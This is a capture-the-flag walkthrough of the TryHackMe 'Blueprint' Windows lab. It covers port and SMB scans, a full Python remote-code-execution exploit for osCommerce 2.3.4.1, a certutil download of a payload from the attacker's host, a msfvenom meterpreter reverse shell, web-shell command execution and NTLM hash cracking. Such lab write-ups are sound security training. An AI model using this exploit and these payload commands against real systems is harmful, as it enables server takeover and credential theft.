# Blueprint (Easy)

- Note: Do you have what is takes to hack into this Windows Machine?
- Hack into this Windows machine and escalate your privileges to Administrator.
- Link: https://tryhackme.com/r/room/blueprint
# .Reconnaissance:

- Scan ports in the machine and directories

```bash
nmap -sV -vv -A -T4 <IP-Target>
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: 404 - File or directory not found.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Bad request!
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        syn-ack ttl 127 MariaDB (unauthorized)
8080/tcp  open  http         syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Index of /
| http-methods: 
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  unknown      syn-ack ttl 127
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10|7|8.1|2012|Vista|11 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_7::-:ultimate cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista
OS fingerprint not ideal because: maxTimingRatio (2.608000e+00) is greater than 1.4
Aggressive OS guesses: Microsoft Server 2008 R2 SP1 (93%), Microsoft Windows 10 (91%), Microsoft Windows 10 10586 - 14393 (91%), Microsoft Windows 10 1607 (91%), Microsoft Windows 7 Ultimate (91%), Microsoft Windows 7 or 8.1 R1 or Server 2008 R2 SP1 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows 7 or 8.1 R1 (91%), Microsoft Windows 8.1 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
```

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.25.105 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 22:53 +07
Nmap scan report for 10.10.25.105
Host is up (0.46s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users: 
|   BLUEPRINT\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Password does not expire, Normal user account
|   BLUEPRINT\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Password does not expire, Normal user account, Password not required
|   BLUEPRINT\Lab (RID: 1000)
|     Full name:   Steve
|_    Flags:       Normal user account
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.25.105\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.25.105\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.25.105\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.25.105\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.25.105\Windows: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 148.20 seconds
```

- We go to port 8080 —> we access into the page oscommerce

![Untitled](https://github.com/user-attachments/assets/b283c953-3de0-4f4e-9c4a-1f62cccd9190)

- We search the vuln by `searchsploit` :

```bash
searchsploit oscommerce 2.3.4
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities         | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection       | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection    | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection     | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site  | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload          | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution          | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)      | php/webapps/50128.py
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- Great! Let check some exploit to find solutions.

![Untitled 1](https://github.com/user-attachments/assets/0983c2fe-bf46-4f97-8d98-ddb065c1f466)

—> Got it! We found the exploit osCommerce and the script exploit was written by Python. Let see inside code.

```bash
# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution
# Date: 29.0.3.2018
# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
# Tested on: Linux, Windows

# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
# PHP code into the config file and then simply executing the code by opening it.

import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://localhost/oscommerce-2.3.4/catalog/"
target_url = "http://localhost/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += '$var=shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.11.75.150:8000/Downloads/shell2.exe shell2.exe");'    # this is where you enter you PHP payload
payload += 'echo $var;'
payload += '/*'

data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")

```

- We can insert PHP payload
- First, we can upload shell.php through /config.php to run command.
- Check script shell PHP:
  
![Untitled 2](https://github.com/user-attachments/assets/0dfa18d4-e4c4-4cf0-a6a3-9a320b1d851a)

- We run script payload to upload file shell PHP:

```bash
shell_exec("cmd.exe /C certutil -urlcache -split -f http://<IP_Machine>simple-shell.php simple-shell.exe");
```

- Run `sudo python3 -m http.server` to open server machine.
- We try to run command shell:  `shell.php?cmd=whoami`

![Untitled 3](https://github.com/user-attachments/assets/37d0f670-38af-4019-9898-0e9c5415e13f)

—> We are in Administrator !

- We create the reverse shell by msfvenom and upload it into the page.

```bash
msfvenom -f windows/meterpreter/reverse_tcp lhost=10.11.75.150 lport=4444 -f exe -o shell2.exe
```
![Untitled 4](https://github.com/user-attachments/assets/2f6341a8-11a4-49d0-a1e3-19b80da3eef4)

![Untitled 5](https://github.com/user-attachments/assets/2c144462-8add-4d80-a55c-a9113cc6293b)

- Because netcat is unstable so in this case we will use Metasploit to be stable.
- Run `msfconsole`  use Payload `windows/meterpreter/reverse_tcp`
- In this page osCommerce we run path url: `http://<IP>:8080/oscommerce-2.3.4/catalog/install/includes/simple-shell.php?cmd=shell2.exe`

![Untitled 6](https://github.com/user-attachments/assets/ac1a28fe-c059-4468-8326-95cbfadf7538)

![Untitled 7](https://github.com/user-attachments/assets/f21b895a-e6ea-4a92-880a-c69ca3f0644f)

- Decrypt NTLM hash of user ‘Lab’

![Untitled 8](https://github.com/user-attachments/assets/59affa98-c128-4a44-ab62-7da7982b953f)

END!!!
